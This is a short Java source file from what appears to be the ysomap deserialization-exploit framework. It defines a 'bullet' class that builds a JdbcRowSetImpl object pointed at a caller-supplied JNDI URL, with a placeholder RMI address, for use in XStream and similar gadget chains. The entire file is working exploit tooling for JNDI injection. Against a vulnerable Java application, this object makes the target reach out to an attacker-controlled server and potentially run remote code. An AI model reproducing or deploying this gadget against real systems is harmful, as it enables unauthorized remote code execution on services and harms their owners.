package ysomap.core.bullet.jdk;

import com.sun.rowset.JdbcRowSetImpl;
import ysomap.common.annotation.Bullets;
import ysomap.common.annotation.NotNull;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;

/**
 * @author wh1t3P1g
 * @since 2020/3/2
 */
@Bullets
public class JdbcRowSetImplBullet extends Bullet<JdbcRowSetImpl> {

    @NotNull
    @Require(name = "jndiURL", detail = "jndi lookup url, like rmi://xxxx:1099/xxx")
    public String jndiURL;

    public String action = "getDatabaseMetaData"; // for xstream eventhandler gadgets

    @Override
    public JdbcRowSetImpl getObject() throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName(jndiURL);
        return jdbcRowSet;
    }
}
